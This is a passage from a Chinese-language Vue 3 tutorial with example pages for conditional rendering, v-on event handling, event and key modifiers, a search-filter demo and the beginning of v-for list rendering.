        num: new Date().getDay(), // 获取当前日期的星期几，星期日为0，星期一为1，依此类推
      }
    }
  };
  Vue.createApp(obj).mount('#card');
</script>
</body>
</html>

```

案例二:用户在登录时，可以切换使用用户账号登录还是邮箱地址登录。

```python
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>案例二:用户再登录时，可以切换使用用户账号登录还是邮箱地址登录</title>
  <script src="vue.js"></script>
</head>
<body>

<div id="app">
  <!-- 使用条件指令根据isUser的值显示不同的登录表单 -->
  <span v-if="isUser">
    <label for="username">用户账号</label>
    <input type="text" id="username" placeholder="用户账号">
  </span>
  <span v-else>
    <label for="email">用户邮箱</label>
    <input type="text" id="email" placeholder="用户邮箱">
  </span>
  <!-- 点击按钮切换isUser的值，实现登录方式的切换 -->
  <button @click="isUser = !isUser">切换类型</button>
</div>
<script>
  var obj = {
    data() {
      return {
        isUser: true // 控制是否显示用户账号登录表单
      }
    }
  }
  var app = Vue.createApp(obj).mount("#app")
</script>

</body>
</html>

```

![测试](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47da9768b3d.gif)

小问题：

如果我们在有输入内容的情况下，切换了类型，我们会发现文字依然显示之前的输入的内容。

但是按道理讲，我们应该切换到另外一个input元素中了,之前甜的内容应该自动清空才对。

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>案例二:用户再登录时，可以切换使用用户账号登录还是邮箱地址登录</title>
  <script src="vue.js"></script>
</head>
<body>

<div id="app">
  <span v-if="isUser">
    <label for="username">用户账号</label>
    <input type="text" id="username" placeholder="用户账号" v-model="username">
  </span>
  <span v-else>
    <label for="email">用户邮箱</label>
    <input type="text" id="email" placeholder="用户邮箱" v-model="email">
  </span>
  <button @click="toggleType">切换类型</button>
</div>
<script>
  var obj = {
    data() {
      return {
        isUser: true,
        username: '',
        email: ''
      }
    },
    methods: {
      toggleType() {
        // 切换类型时清空输入内容
        this.username = '';
        this.email = '';

        // 切换isUser的值
        this.isUser = !this.isUser;
      }
    }
  }
  var app = Vue.createApp(obj).mount("#app")
</script>

</body>
</html>
```

![测试](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47daa483c7e.gif)

案例三:根据后端返回的数据,显示订单不同的发货状态。

```vue
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>案例三:根据后端返回的数据,显示订单不同的发货状态。</title>
  <script src="vue.js"></script>
</head>

<body>
<div id="box">
  <ul>
    <li v-for="item in datalist">
      {{item.title}}
      <div v-if="item.state===0">
        <b>未付款</b>
      </div>
      <div v-else-if="item.state===1">
        <b>待发货</b>
      </div>
      <div v-else-if="item.state===2">
        <b>已结束</b>
      </div>
      <div v-else>
        <b>已取消</b>
      </div>
    </li>
  </ul>
</div>
<script>
  // v-if v-else-if v-else
  var obj = {
    data() {
      return {
        datalist:[
          {
            title:"手机",
            state:0
          },
          {
            title:"衣服",
            state:1
          },
          {
            title:"袜子",
            state:2
          },
          {
            title:"羊皮",
            state:3
          },
          {
            title:"手机1",
            state:0
          },
          {
            title:"衣服2",
            state:1
          },
          {
            title:"袜子2",
            state:2
          },
          {
            title:"羊皮2",
            state:3
          }
        ]
      }
    }
  }
  var app = Vue.createApp(obj).mount("#box")
</script>
</body>
</html>
```

### 5.3 v-if 与 template 

在 Vue 中，`v-if` 指令用于根据条件判断是否渲染元素。除了直接使用 `v-if`，**Vue 还提供了 `template` 元素作为条件块的包裹容器。**

在某些情况下，我们可能需要在同一级别内渲染多个元素，而不是单个元素。这时，可以使用 `template` 元素作为条件块的包裹容器，它不会被渲染为实际的 DOM 元素，只用于提供一个容器来包裹多个元素。

以下为一段代码举例:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-if 与 </title>
    <script src="vue.js"></script>
</head>
<body>
<div id ="app">
    <template v-if="condition">
        <!-- 根据条件渲染的内容 -->
        <div>11111</div>
        <div>22222</div>
        <div>33333</div>
        <span></span>
    </template>
</div>
<script>
  var app = {
    data() {
      return {
        condition: true
      }
    }
  }
  Vue.createApp(app).mount("#app")
</script>
</body>
</html>
```

使用 `template` 元素可以在不引入额外的父级元素的情况下，根据条件渲染多个元素。这在编写模板时可以更加灵活和方便。

需要注意的是，`template` 元素本身不会被渲染到最终的 HTML 结构中，它只是一个临时的包裹容器。因此，在使用 `template` 元素时，我们可以在其中放置任意数量的元素，并且它们都会根据条件进行渲染或移除。

**总结来说，`v-if` 指令用于根据条件判断是否渲染元素，而 `template` 元素可作为条件块的包裹容器，用于包含多个元素，并根据条件进行统一的渲染或移除操作。**

## 六、事件绑定与监听

在前端开发中，我们需要经常和用于交互。
这个时候，我们就必须监听用户发生的时间，比如点击、拖拽、键盘事件等等

首先我们使用原生JS 来绑定事件,下面是一段简单的举例代码.

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue 事件绑定</title>
    <!-- 引入 Vue.js 库 -->
    <script src="vue.js"></script>
</head>
<body>
<div id="box">
    <!-- 在页面中显示 name 的值 -->
    {{ name }}
    <!-- 当按钮被点击时调用 handleClick 函数 -->
    <button onclick="handleClick()">click</button>
</div>
<script>
    // 点击按钮时触发的函数
    function handleClick(){
        console.log("click")
        // 修改 app 对象的 name 属性的值为 "xiao ming"
        app.name = "xiao ming"
    }
    
    // 创建一个 Vue 应用程序实例
    var obj ={
        data(){
            // data 函数返回一个包含 name 属性的对象
            return {
                name:"jarvis"
            }
        }
    }
    // 使用 Vue.createApp 方法创建 Vue 应用程序实例，并将其挂载到 id 为 "box" 的元素上
    var app = Vue.createApp(obj).mount("#box")
    
</script>
</body>
</html>
```

上面的代码概述如下：

1. 首先，在 HTML 头部的 `<script>` 标签中引入了 Vue.js 库。
2. 在页面主体部分，有一个 `<div>` 元素，它的 id 属性设置为 "box"，并且包含一个按钮和一个双括号语法 `{{ name }}`，用于显示 `name` 属性的值。
3. 在 `<script>` 标签中，定义了一个名为 `handleClick` 的函数，它会在按钮被点击时执行。该函数会将字符串 "click" 输出到浏览器的控制台，并且将 `app` 对象的 `name` 属性的值设置为 "xiao ming"。
4. 接下来，定义了一个 JavaScript 对象 `obj`，其中包含一个名为 `data` 的方法。该方法返回一个对象，其中的 `name` 属性初始值为 "jarvis"。
5. 使用 `Vue.createApp` 方法创建一个 Vue 应用程序实例，并将 `obj` 对象作为参数传入。然后，通过调用 `.mount("#box")` 方法，将该实例挂载到 id 为 "box" 的 `<div>` 元素上。
6. 最终，当页面加载时，Vue.js 会自动将 `name` 属性的初始值 "jarvis" 显示在双括号语法 `{{ name }}` 的位置上。当按钮被点击时，`handleClick` 函数会被调用，将 `name` 属性的值修改为 "xiao ming"，并在控制台输出 "click"。

虽然我们在上面的代码中使用原生的Js实现了事件绑定,Vue也只是模板解析,这里我们必须借助全局变量才能访问到Vue内部的状态,利用全局变量再去操作里面的状态,但是全局变量我们一般都是在代码测试或者调试阶段去写的,所以在平时开发中,一般都不建议这样做,这已经违背了我们程序的设计理念:可维护性、可扩展性和可测试性。使用全局变量可能会导致以下问题：

1. 命名冲突：全局变量容易导致命名冲突，特别是在大型项目中，不同模块使用相同的全局变量名可能会引发错误。
2. 难以追踪和调试：全局变量使代码的状态变得不明确，增加了代码的复杂性，使得追踪和调试问题变得更加困难。
3. 不利于模块化和组件化：全局变量破坏了模块化和组件化的原则，使得代码的耦合度增加，难以重用和维护。

所以Vue官方也为我们提供了一套指令:v-on指令

### 6.1 V-on介绍

`v-on` 是 Vue.js 中的一个指令，用于在 HTML 元素上绑定事件监听器。

通过 `v-on` 指令，你可以监听各种事件，例如点击事件、鼠标移动事件、键盘事件等。当指定的事件被触发时，指定的方法会被执行。

1. 简写语法：

   在大多数情况下，我们使用的是 `v-on` 的简写语法，即使用 `@` 符号来表示 `v-on` 指令。例如，`v-on:click` 可以简写为 `@click`。

   ```vue
   <button @click="methodName"></button>
   ```

   上述代码中，`@click` 表示监听按钮的点击事件，并调用名为 `methodName` 的方法。

2. 完整语法：

   完整语法中，我们使用 `v-on:` 前缀来表示 `v-on` 指令。

   ```vue
   <button v-on:click="methodName"></button>
   ```

   上述代码与简写语法的效果是相同的，都会监听按钮的点击事件，并调用 `methodName` 方法。

| 指令     | 释义                                                         |
| -------- | ------------------------------------------------------------ |
| v-on     | 绑定事件监听器（不推荐使用完整语法）                         |
| @        | 绑定事件监听器（推荐使用简写语法）                           |
| @[event] | 绑定特定事件监听器（可以替换 `[event]` 为具体的事[事件](https://www.jquery123.com/category/events/)名称，如 `@click`、`@input` 等） |

我们将上面的代码改写如下:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Vue 事件绑定</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="box">
  {{ name }}
  <!-- 使用 v-on 指令绑定点击事件 -->
  <button v-on:click="handleClick">按钮1完整写法</button>
  <!--  简写方式,v-on:click 可以缩写成@click-->
  <button @click="handleClick">按钮2简写</button>
</div>
<script>
  var obj = {
    data() {
      return {
        name: "jarvis"
      }
    },
    methods: {
      handleClick() {
        console.log("click");
        this.name = "xiao ming";
      }
    }
  }
  var app = Vue.createApp(obj).mount("#box")
</script>
</body>
</html>

```

使用上面的代码后,我实现了和原来使用原生JS一样的效果.

好了,下面我们来做一个小练习,需求如下:

1. 页面创建一个 id 为 "box" 的容器。
2. 页面中包含多个按钮，每个按钮都有一个相应的点击事件处理函数。
3. 第一个按钮（点我1）绑定了 `handleClick1` 方法，当点击该按钮时，在控制台中输出 "点我1"。
4. 第二个按钮（点我2）绑定了 `handleClick2` 方法，当点击该按钮时，在控制台中输出 "点我2"。
5. 第三个按钮（点我3-1）绑定了 `handleClick3` 方法，当点击该按钮时，在控制台中输出参数的值（这里没有传递参数，所以会输出 `undefined undefined undefined`）。
6. 第四个按钮（点我3-2）绑定了 `handleClick3` 方法，并传递了参数 1、22 和 333。当点击该按钮时，在控制台中输出传递的参数值。
7. 第五个按钮（点我4）绑定了 `handleClick4` 方法，并传递了事件对象 `$event`。当点击该按钮时，在控制台中输出事件对象。

具体实现代码如下:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>事件指令</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="box">
  <button v-on:click="handleClick1">点我1</button>
  <!-- 下面这个用的多 -->
  <button @click="handleClick2">点我2</button>
  <!-- 如果不传参数，是没有区别的 -->
  <button @click="handleClick3()">点我3-1(带括号)</button>
  <!-- 如果要传参数 -->
  <button @click="handleClick3(1,22,333)">点我3-2(带括号+参数)</button>
  <!-- 传入事件 -->
  <button @click="handleClick4($event)">点我4(带事件参数)</button>
</div>
<script>
  var obj = {
    data() {
      
    },
    methods: {
      handleClick1() {
        console.log('点我1');
      },
      handleClick2() {
        console.log('点我2');
      },
      handleClick3(a, b, c) {
        console.log(a, b, c);
      },
      handleClick4(event) {
        console.log(event);
      }
    }
  };
  Vue.createApp(obj).mount('#box');
</script>
</body>
</html>
```

![img](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47dafb4c883.gif)

### 6.2 v-on参数

当通过methods中定义方法，以供@click调用时，需要注意参数问题：

#### 6.2.1加与不加()区别

情况一：如果该方法不需要额外参数，**那么方法后的()可以不添加。**

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="app">
  <!--1.事件调用的方法没有参数-->
  <h2>点击次数{{count}}</h2>
  <button @click="handlerAdd()">按钮1(带括号)</button>
  <button @click="handlerAdd">按钮1(不带括号)</button>
</div>
<script >
  var obj = {
    data() {
      return {
        count: 0
      }
    },
    methods: {
      handlerAdd() {
        this.count++
      }
    }
  }
  Vue.createApp(obj).mount("#app")
</script>
</body>
</html>
```

**但是需要注意的是:如果方法本身中有一个参数，那么会默认将原生事件event参数传递进去**

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="vue.js"></script>
</head>
<body>
<div id="app">
    <!--2.在事件定义时, 写方法时省略了小括号, 但是方法本身是需要一个参数的, 这个时候, Vue会默认将浏览器生产的event事件对象作为参数传入到方法-->
    <!-- 当点击该按钮时，会将参数123传递给btn2Click方法。在控制台中，将会打印出-------- 123，表示事件对象和参数123。-->
    <button @click="btn2Click(123)">按钮2 加入了参数</button>
    <!-- 该按钮会触发一个错误，因为在btn2Click方法的定义中，它期望接收一个事件对象作为参数，但是在模板中，我们没有传递任何参数，所以调用该方法时将得到undefined。在控制台中会打印出-------- undefined。  -->
    <button @click="btn2Click()">按钮2带括号</button>
    <!-- 当点击该按钮时，btn2Click方法将会执行，但是它不会接收任何参数。在控制台中将会打印出-------- PointerEvent，表示事件对象（这里是PointerEvent对象） -->
    <button @click="btn2Click">按钮2不带括号</button>
</div>
<script>
    var obj = {
        data() {
            return {
                count: 0
            }
        },
        methods: {
            btn2Click(event) {
                console.log('--------', event);
            }
        }
    }
    Vue.createApp(obj).mount("#app")
</script>
</body>
</html>
```

#### 6.2.2 加括号传参同时传入`event`事件

情况二：如果需要同时传入某个参数，同时需要`event`时，可以通过`$event`传入事件。

~~~vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="vue.js"></script>
</head>
<body>
<div id="app">
    <!--3.方法定义时, 我们需要event对象, 同时又需要其他参数-->
    <!-- 在调用方式, 如何手动的获取到浏览器参数的event对象: $event-->
    <button @click="btn3Click(count, $event)">按钮3</button>
</div>
<script>
    var obj = {
        data() {
            return {
                count: 0
            }
        },
        methods: {
            btn3Click(abc, event) {
                console.log('++++++++', abc, event);
            }
        }
    }
    Vue.createApp(obj).mount("#app")
</script>
</body>
</html>
~~~

**拓展:**当函数需要参数但未传入时，函数的形参将会是`undefined`。下面是一个完整的代码示例来说明这一点：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="app">
  <button @click="handleClick()">点击按钮</button>
</div>
<script>
  const app = Vue.createApp({
    methods: {
      handleClick(param) {
        console.log('参数值为:', param);
      }
    }
  });
  app.mount("#app");
</script>
</body>
</html>
```

### 6.3 内联事件处理器与方法事件处理器

事件处理器（handler）的值可以是：

1. 内联事件处理器：可以直接在模板中使用内联 JavaScript 语句作为事件处理函数，类似于传统的 `onclick` 事件处理方式。示例：

   ```vue
   <template>
     <button v-on:click="alert('按钮被点击了')">点击我</button>
   </template>
   ```

   总结：内联事件处理器直接在模板中定义，适用于简单的事件处理逻辑。它的优点是简单直观，可以快速实现简单的操作。但是对于复杂的逻辑，代码量会增加，并且不易维护和重用。

2. 方法事件处理器：可以将事件处理逻辑封装在组件定义的方法中，并在模板中引用方法名。示例：

   ```vue
   <button @click="handleClick">点击我</button>
   ```

   在Vue组件中定义方法：

   ```javascript
   methods: {
     handleClick() {
       // 处理事件的逻辑代码
     }
   }
   ```

   总结：方法事件处理器将事件处理逻辑封装在组件的方法中，使代码结构更清晰。它的优点是可以将复杂的逻辑抽离到方法中，提高代码的可读性和维护性。同时，可以在多个事件中复用同一个方法，减少重复代码的编写。

### 6.4 v-on 修饰符

当处理事件时，Vue提供了一些修饰符，用于方便地进行事件操作和控制。这些修饰符可以附加在事件绑定上，以改变事件的行为。以下是这些修饰符的总结和示例：

+ `.stop`：调用 `event.stopPropagation()`，阻止事件继续传播。

```vue
<button @click.stop="handleClick">按钮</button>
```

+ `.prevent`：调用 `event.preventDefault()`，阻止事件的默认行为。

  ```vue
  <form @submit.prevent="handleSubmit">提交表单</form>
  ```

+ `.{keyCode | keyAlias}`：只当事件是从特定键触发时才触发回调。可以使用键盘键码或键别名。

  ```vue
  <input @keyup.enter="handleEnterKey">按下回车键触发回调</input>
  ```

+ `.native`：监听组件根元素的原生事件，而不是组件内部的子元素。

  ```vue
  <my-component @click.native="handleClick">自定义组件的根元素点击事件</my-component>
  ```

+ `.native`：监听组件根元素的原生事件，而不是组件内部的子元素。

  ```vue
  <my-component @click.native="handleClick">自定义组件的根元素点击事件</my-component>
  ```

+ `.once`：只触发一次回调，即事件处理函数只会执行一次。

  ```vue
  <button @click.once="handleClick">按钮（只触发一次）</button>
  ```

![image-20210428161522801](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db11e7975.png)

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>v-on 修饰符</title>
</head>
<body>

<div id="app">
  <!--1. .stop修饰符的使用-->
  <div @click="divClick">
    aaaaaaa
    <button @click.stop="btnClick">按钮</button>
  </div>

  <!--2. .prevent修饰符的使用-->
  <br>
  <form action="baidu">
    <input type="submit" value="提交" @click.prevent="submitClick">
  </form>

  <!--3. .监听某个键盘的键帽-->
  <input type="text" @keyup.enter="keyUp">

  <!--4. .once修饰符的使用-->
  <button @click.once="btn2Click">按钮2</button>
</div>

<script src="vue.js"></script>
<script>
  const app = Vue.createApp({
    data() {
      return {
        message: '你好啊'
      }
    },
    methods: {
      btnClick() {
        console.log("btnClick");
      },
      divClick() {
        console.log("divClick");
      },
      submitClick() {
        console.log('submitClick');
      },
      keyUp() {
        console.log('keyUp');
      },
      btn2Click() {
        console.log('btn2Click');
      }
    }
  });

  app.mount('#app');
</script>

</body>
</html>
```

## 七、事件处理修饰符与指令

### 7.1 事件处理指令

当使用Vue处理事件时，我们可以通过事件处理指令来监听和响应用户的操作和交互。Vue提供了一些常用的事件处理指令，其中包括`@input`、`@change`和`@blur`等。

| 事件处理指令  | 说明                                                         | 示例                                            |
| ------------- | ------------------------------------------------------------ | ----------------------------------------------- |
| `@click`      | 鼠标点击事件处理                                             | `<button @click="handleClick">点击我</button>`  |
| `@keydown`    | 键盘按键按下事件处理                                         | `<input @keydown="handleKeydown">`              |
| `@submit`     | 表单提交事件处理                                             | `<form @submit="handleSubmit">...</form>`       |
| `@input`      | 用于监听输入框进行输入时触发的事件。通过在模板中添加`@input`指令，并绑定对应的方法，可以实时获取用户输入的内容并进行相应的处理。 | `<input @input="handleInput">`                  |
| `@change`     | 输入框值变化事件处理（失去焦点触发）                         | `<input @change="handleChange">`                |
| `@focus`      | 输入框获取焦点事件处理                                       | `<input @focus="handleFocus">`                  |
| `@blur`       | 用于监听输入框失去焦点时触发的事件。无论输入框是否为空，`@blur`指令都会触发。我们可以通过`@blur`指令来监听输入框失去焦点后的操作，例如验证输入、格式化数据等。 | `<input @blur="handleBlur">`                    |
| `@mouseover`  | 鼠标悬停事件处理                                             | `<div @mouseover="handleMouseOver">...</div>`   |
| `@mouseleave` | 鼠标离开事件处理                                             | `<div @mouseleave="handleMouseLeave">...</div>` |
| `@change`     | 用于监听元素的值发生改变时触发的事件。与`@input`不同之处在于，`@change`事件在元素失去焦点后触发。我们可以利用`@change`指令来监听用户完成输入后的操作，例如提交表单、执行验证等。 | `<input @change="handleChange">`                |

这些事件处理指令可以通过`v-on`指令的简写形式`@`来使用。在模板中使用相应的事件处理指令时，将其绑定到一个方法或者内联JavaScript语句上，以便在事件触发时执行相应的操作。

change 和 blur 最本质的区别：**如果输入框为空，失去焦点后，change不会触发，但是blur会触发**

### 7.2 模糊搜索过滤案例

下面我们来简单实现一个模糊搜索过滤案例,代码如下:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>过滤案例</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="box">
  <p><input type="text" v-model="myText" @input="handleInput" placeholder="请输入要筛选的内容："></p>
  <ul>
    <li v-for="data in newList" :key="data">{{data}}</li>
  </ul>
</div>
<script>
  const app = Vue.createApp({
    data() {
      return {
        myText: '',
        dataList: ['a', 'at', 'atom', 'be', 'beyond', 'cs', 'csrf'],
        newList: ['a', 'at', 'atom', 'be', 'beyond', 'cs', 'csrf'],
      };
    },
    methods: {
      handleInput() {
        this.newList = this.dataList.filter(item => {
          // item.indexOf(this.myText)：输入框中输入的字符串在筛选元素中的索引
          return item.indexOf(this.myText) > -1; // 返回索引大于1的元素：>-1 就表示包含在其中
        });
      },
    },
  });

  app.mount('#box');
</script>
</body>
</html>
```

![img](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db2cbc159.gif)

上面的代码是一个Vue的过滤案例，实现了根据输入框中的内容对列表进行筛选显示。根据输入框中的文本，通过使用 `@input` 事件监听输入框的输入事件，调用 `handleInput` 方法进行筛选逻辑。

代码中的关键部分如下：

```vue
<p><input type="text" v-model="myText" @input="handleInput" placeholder="请输入要筛选的内容："></p>
```

在输入框中使用 `v-model` 指令绑定了 `myText` 变量，实现了输入框与数据的双向绑定。同时，使用 `@input` 事件监听输入框的输入事件，当输入框的值发生变化时，会调用 `handleInput` 方法进行处理。

```js
methods: {
  handleInput() {
    this.newList = this.dataList.filter(item => {
      return item.indexOf(this.myText) > -1
    })
  },
},
```

在 `handleInput` 方法中，通过使用 `filter` 方法对 `dataList` 进行筛选，将满足条件的元素添加到 `newList` 数组中。这里使用了数组的 `indexOf` 方法来判断元素是否包含输入框中的文本，如果包含则返回索引大于-1，表示符合筛选条件。

最终，通过在模板中使用 `v-for` 指令遍历 `newList` 数组，并显示在页面上的 `<li>` 元素中。

总结：该代码实现了一个简单的过滤功能，根据输入框中的内容实时筛选列表中的元素，并动态更新显示。使用 `@input` 事件监听输入框的输入事件，调用方法进行筛选逻辑，通过数组的 `filter` 方法对数据进行过滤。这样可以实现实时的列表筛选效果，提升了用户体验。

### 7.3 事件修饰符

| 修饰符     | 描述                                                         | 示例                                                         |
| ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `.stop`    | 阻止事件冒泡，相当于调用 `event.stopPropagation()`           | `<button @click.stop="doSomething">点击</button>`            |
| `.prevent` | 阻止事件默认行为，相当于调用 `event.preventDefault()`        | `<form @submit.prevent="submitForm">...</form>`              |
| `.capture` | 使用事件捕获模式，即在父元素上触发事件处理程序，而不是在子元素上触发 | `<div @click.capture="parentClicked">...</div>`              |
| `.self`    | 仅当事件在元素自身上触发时才调用事件处理程序，而不是在子元素上触发 | `<div @click.self="doSomething">...</div>`                   |
| `.once`    | 事件只触发一次，即事件处理程序将在第一次触发后被移除         | `<button @click.once="doSomething">点击一次</button>`        |
| `.passive` | 指示事件监听器不会调用 `event.preventDefault()`              | `<div @scroll.passive="handleScroll">...</div>`              |
| `.native`  | 监听组件根元素的原生事件，而不是子组件的事件                 | `<my-component @click.native="handleClick">...</my-component>` |
| `.sync`    | 在父组件中更新一个 prop 的值时，将子组件中的同名 prop 的值自动同步更新 | `<child-component :prop.sync="value">...</child-component>`  |

使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生

用 `v-on:click.prevent.self` 会阻止**所有的点击**
而 `v-on:click.self.prevent` 只会阻止**对元素自身的点击**

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>事件修饰符</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="box">
  <ul @click.self="handleUl">
    <li v-for="data in dataList" @click.stop="handleLi">{{data}}</li>
    <li><a href="http://www.baidu.com">不拦截</a></li>
    <li><a href="http://www.baidu.com" @click="handleLink">点击拦截</a></li>
    <li><a href="https://www.baidu.com" @click.prevent="handleLink">点击拦截</a></li>
    <li><button @click.once="test">只执行一次</button></li>
  </ul>
</div>
</body>
<script>
  const app = Vue.createApp({
    data() {
      return {
        dataList: ['1', '22', '333', '4444']
      };
    },
    methods: {
      handleUl() {
        console.log('ul被点击了');
      },
      handleLi(event) {
        console.log('li被点击了');
        event.stopPropagation(); // 点击事件停止冒泡（向父组件传递事件）
      },
      handleLink(event) {
        event.preventDefault(); // 阻止默认行为（跳转链接）
      },
      test() {
        alert('只触发1次');
      }
    }
  });

  app.mount('#box');
</script>
</html>
```

**事件冒泡**

![事件冒泡](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db36ae319.gif)

**阻止事件冒泡**

![阻止事件冒泡](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db41c9f75.gif)

**阻止链接跳转+只执行1次**

![阻止链接跳转+只执行1次](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db5b3072c.gif)

`.passive` 修饰符一般用于触摸事件的监听器，可以用来[改善移动端设备的滚屏性能](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener#使用_passive_改善滚屏性能)。

然而，如果你试图将 `.passive` 和 `.prevent` （一个用于阻止事件默认行为的修饰符）一起使用，浏览器将会忽略 `.prevent`。这是因为使用 `.passive` 修饰符已经向浏览器表明了你不打算阻止事件的默认行为。如果你仍然尝试这样做，浏览器将会抛出一个警告。因此，**`.passive` 和 `.prevent` 不应同时使用**。

### 7.4 按键修饰符

| 按键修饰符 | 描述                                       | 示例                                                 |
| ---------- | ------------------------------------------ | ---------------------------------------------------- |
| `.enter`   | 监听回车键                                 | `<input @keyup.enter="submitForm">`                  |
| `.tab`     | 监听Tab键                                  | `<input @keyup.tab="focusNextField">`                |
| `.delete`  | 监听删除键                                 | `<input @keyup.delete="deleteItem">`                 |
| `.esc`     | 监听Esc键                                  | `<input @keyup.esc="cancelAction">`                  |
| `.space`   | 监听空格键                                 | `<button @keyup.space="startPlayback">播放</button>` |
| `.up`      | 监听向上箭头键                             | `<input @keydown.up="moveUp">`                       |
| `.down`    | 监听向下箭头键                             | `<input @keydown.down="moveDown">`                   |
| `.left`    | 监听向左箭头键                             | `<input @keydown.left="moveLeft">`                   |
| `.right`   | 监听向右箭头键                             | `<input @keydown.right="moveRight">`                 |
| `.ctrl`    | 监听Ctrl键                                 | `<button @click.ctrl="doSomething">点击</button>`    |
| `.alt`     | 监听Alt键                                  | `<button @click.alt="doSomething">点击</button>`     |
| `.shift`   | 监听Shift键                                | `<button @click.shift="doSomething">点击</button>`   |
| `.meta`    | 监听Meta/Command键（Windows键或Command键） | `<button @click.meta="doSomething">点击</button>`    |

按键修饰符举例:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>按键修饰符</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="box">
  <input type="text" @keyup="handleKey1">
  <input type="text" @keyup.enter="handleKey2">
</div>
</body>
<script>
  const app = Vue.createApp({
    methods: {
      handleKey1(event) {
        console.log('按下了' + event.key);
      },
      handleKey2(event) {
        console.log('按下了回车键');
      }
    }
  });

  app.mount('#box');
</script>
</html>

```

![img](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db65cba59.gif)

在 Vue 2 中，有许多内置的按键别名，如 `enter`，`tab`，`delete` （捕获 "删除" 和 "退格" 键），`esc`，`space`，`up`，`down`，`left`，`right`。此外，Vue 2 还允许通过 `Vue.config.keyCodes` 对象自定义按键别名：在 Vue 2 中，对于非标准的按键，通常需要用到 `Vue.config.keyCodes` 来设置别名：

```vue
// Vue 2
Vue.config.keyCodes.f1 = 112;
```

然后你可以在模板中使用这个别名：

```vue
<input @keyup.f1="handleF1">
```

然而在 Vue 3 中，为了简化库的核心并且遵循原生浏览器的行为，移除了这个特性，也就是说，`Vue.config.keyCodes` 在 Vue 3 中不再可用。但是，Vue 3 允许开发者直接使用按键的名字作为修饰符，不论是否是标准的按键。例如，你可以在 Vue 3 中直接使用 `f1` 作为修饰符，而不需要任何额外的配置：

```vue
<!-- Vue 3 -->
<input @keyup.f1="handleF1">
```



## 八、V-for 循环遍历

### 8.1 v-for 基本介绍

在 Vue 中，`v-for` 指令用于遍历数组或对象，并根据数据集合中的每个项来渲染相应的元素。通过 `v-for`，我们可以轻松地在模板中生成重复的元素或列表。当我们有一组数据需要进行渲染时，我们就可以使用v-for来完成。v-for指令 类似于`JavaScript`中的for循环。

使用 `v-for` 指令时，我们需要提供一个迭代的源，可以是数组或对象，以及一个变量来表示当前迭代的项。在模板中，我们使用特殊的语法 `item in items` 来指定迭代的方式。

### 8.2 v-for遍历数组

以下是一个使用 `v-for` 渲染列表的示例：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-for 遍历数组</title>
    <script src="vue.js"></script>
</head>
<body>

<div id="app">
    <!--1.在遍历的过程中,没有使用索引值(下标值)-->
    <ul>
        <li v-for="item in names">{{item}}</li>
    </ul>

    <!--2.在遍历的过程中, 获取索引值-->
    <ul>
        <li v-for="(item, index) in names">
            {{index+1}}.{{item}}
        </li>
    </ul>
</div>

<script>
    var app = {
        data() {
            return {
                names: ['why', 'kobe', 'james', 'curry']
            }
        }
    }
    Vue.createApp(app).mount('#app')
</script>

</body>
</html>
```

上述代码演示了使用 `v-for` 指令遍历数组的两种方式，并在每个遍历项中展示对应的数据。

1. 在第一个 `ul` 中的 `v-for` 循环中，使用 `item in names` 的语法，遍历了数组 `names` 中的每个元素。在每次迭代中，将当前迭代项赋值给 `item`，然后使用 `{{ item }}` 显示该项的值。这样，每个数组元素都会被渲染为一个 `<li>` 元素，并显示在列表中。
2. 在第二个 `ul` 中的 `v-for` 循环中，使用 `(item, index) in names` 的语法，除了获取每个数组元素的值，还获取了对应的索引值。在每次迭代中，将当前迭代项赋值给 `item`，将当前索引赋值给 `index`。然后使用 `{{ index+1 }}.{{ item }}` 的形式显示索引值和对应的数组元素值。这样，每个数组元素都会以索引加上对应的编号的形式显示在列表中。

总的来说，通过 `v-for` 指令的使用，可以方便地遍历数组，并在遍历过程中获取每个元素的值和索引值，并根据需要进行展示和处理。

### 8.3 v-for遍历对象

除了遍历数组，`v-for` 也可以用于遍历对象的属性。在这种情况下，我们可以使用 `(value, key) in object` 的语法来指定迭代的方式，其中 `value` 表示属性的值，`key` 表示属性的键。

